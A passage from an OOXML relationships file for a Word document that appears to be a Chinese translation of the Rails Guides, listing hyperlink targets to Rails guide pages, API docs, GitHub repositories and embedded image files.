Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId526" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId527" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId528" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId529" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rails-i18n.org/wiki" TargetMode="External"/><Relationship Id="rId200" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/joelmoss/dynamic_form" TargetMode="External"/><Relationship Id="rId201" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId202" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId203" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.png"/><Relationship Id="rId204" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId205" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId206" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.png"/><Relationship Id="rId207" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId208" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId209" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId1080" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveSupport/Notifications.html" TargetMode="External"/><Relationship Id="rId1081" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1082" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1083" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1084" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveSupport/Inflector.html" TargetMode="External"/><Relationship Id="rId1085" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1086" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1087" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId1088" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1089" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId850" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://scoutapp.com" TargetMode="External"/><Relationship Id="rId851" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId852" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId853" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId854" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId855" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId856" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId857" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId858" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId859" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId530" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId531" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/activerecord/lib/active_record/locale/en.yml" TargetMode="External"/><Relationship Id="rId532" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/activesupport/lib/active_support/locale/en.yml" TargetMode="External"/><Relationship Id="rId533" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://groups.google.com/group/rails-i18n/browse_thread/thread/14dede2c7dbe9470/80eec34395f64f3c?hl=en" TargetMode="External"/><Relationship Id="rId534" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rails-i18n.org/wiki" TargetMode="External"/><Relationship Id="rId535" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/joshmh/globalize2/tree/master" TargetMode="External"/><Relationship Id="rId536" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Representational_State_Transfer" TargetMode="External"/><Relationship Id="rId537" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.infoq.com/articles/rest-introduction" TargetMode="External"/><Relationship Id="rId538" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://it.application.local:3000" TargetMode="External"/><Relationship Id="rId539" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionController/Base.html" TargetMode="External"/><Relationship Id="rId210" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.png"/><Relationship Id="rId211" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.png"/><Relationship Id="rId212" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId213" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId214" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId215" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId216" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId217" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId218" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId219" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId1090" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1091" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1092" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1093" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1094" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1095" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1096" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1097" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1098" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId1099" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/plugins.html" TargetMode="External"/><Relationship Id="rId860" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId861" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId862" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId863" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId864" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId865" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId866" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId867" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId868" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId869" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId540" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionController/Base.html" TargetMode="External"/><Relationship Id="rId541" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionController/Resources.html" TargetMode="External"/><Relationship Id="rId542" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/svenfuchs/routing-filter/tree/master" TargetMode="External"/><Relationship Id="rId543" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/raul/translate_routes/tree/master" TargetMode="External"/><Relationship Id="rId544" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3.org/International/questions/qa-lang-priorities" TargetMode="External"/><Relationship Id="rId545" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/iain/http_accept_language/tree/master" TargetMode="External"/><Relationship Id="rId546" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rack/rack-contrib/blob/master/lib/rack/contrib/locale.rb" TargetMode="External"/><Relationship Id="rId547" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.maxmind.com/app/geolitecountry" TargetMode="External"/><Relationship Id="rId548" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.png"/><Relationship Id="rId549" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><Relationship Id="rId220" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId221" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId222" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId223" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId224" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId225" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId226" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId227" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId228" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId229" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId870" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId871" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId872" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId873" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId874" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/api_app.html" TargetMode="External"/><Relationship Id="rId875" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.ruby-doc.org/stdlib/libdoc/erb/rdoc/" TargetMode="External"/><Relationship Id="rId876" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.sqlite.org" TargetMode="External"/><Relationship Id="rId877" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId878" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId879" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId550" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.png"/><Relationship Id="rId551" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.png"/><Relationship Id="rId552" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId553" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/svenfuchs/rails-i18n/tree/master/rails/locale" TargetMode="External"/><Relationship Id="rId554" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rails-i18n.org/wiki" TargetMode="External"/><Relationship Id="rId555" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://unicode.org/repos/cldr-tmp/trunk/diff/supplemental/language_plural_rules.html" TargetMode="External"/><Relationship Id="rId556" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://unicode.org/repos/cldr-tmp/trunk/diff/supplemental/language_plural_rules.html" TargetMode="External"/><Relationship Id="rId557" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://unicode.org/repos/cldr-tmp/trunk/diff/supplemental/language_plural_rules.html" TargetMode="External"/><Relationship Id="rId558" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://unicode.org/repos/cldr-tmp/trunk/diff/supplemental/language_plural_rules.html" TargetMode="External"/><Relationship Id="rId559" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image19.png"/><Relationship Id="rId230" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId231" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId232" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId233" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId234" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId235" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId236" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId237" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId238" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId239" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId880" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId881" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId882" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId883" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId884" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId885" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId886" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId887" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId888" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId889" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId560" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId561" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/actionpack/lib/action_view/locale/en.yml" TargetMode="External"/><Relationship Id="rId562" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/activesupport/lib/active_support/locale/en.yml" TargetMode="External"/><Relationship Id="rId563" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/activesupport/lib/active_support/locale/en.yml" TargetMode="External"/><Relationship Id="rId564" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/actionpack/lib/action_view/locale/en.yml" TargetMode="External"/><Relationship Id="rId565" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/actionpack/lib/action_view/locale/en.yml" TargetMode="External"/><Relationship Id="rId566" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/activerecord/lib/active_record/locale/en.yml" TargetMode="External"/><Relationship Id="rId567" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/activemodel/lib/active_model/locale/en.yml" TargetMode="External"/><Relationship Id="rId568" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails/blob/master/activesupport/lib/active_support/locale/en.yml" TargetMode="External"/><Relationship Id="rId569" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId240" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId241" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId242" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId243" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId244" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId245" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId246" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId247" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId248" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId249" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId890" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId891" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId892" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId893" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId894" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId895" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId896" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId897" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId898" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId899" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId570" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://i18n.lighthouseapp.com/projects/14948-rails-i18n/overview" TargetMode="External"/><Relationship Id="rId571" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://groups.google.com/group/rails-i18n" TargetMode="External"/><Relationship Id="rId572" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://groups.google.com/group/rails-i18n" TargetMode="External"/><Relationship Id="rId573" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/svenfuchs/rails-i18n/tree/master/rails/locale" TargetMode="External"/><Relationship Id="rId574" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/guides/fork-a-project-and-submit-your-modifications" TargetMode="External"/><Relationship Id="rId575" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/guides/pull-requests" TargetMode="External"/><Relationship Id="rId576" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rails-i18n.org" TargetMode="External"/><Relationship Id="rId577" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rails-i18n.org/wiki" TargetMode="External"/><Relationship Id="rId578" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://groups.google.com/group/rails-i18n" TargetMode="External"/><Relationship Id="rId579" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/svenfuchs/rails-i18n/tree/master" TargetMode="External"/><Relationship Id="rId250" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId251" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId252" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId253" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId254" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId255" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId256" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId257" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId258" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId259" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId700" 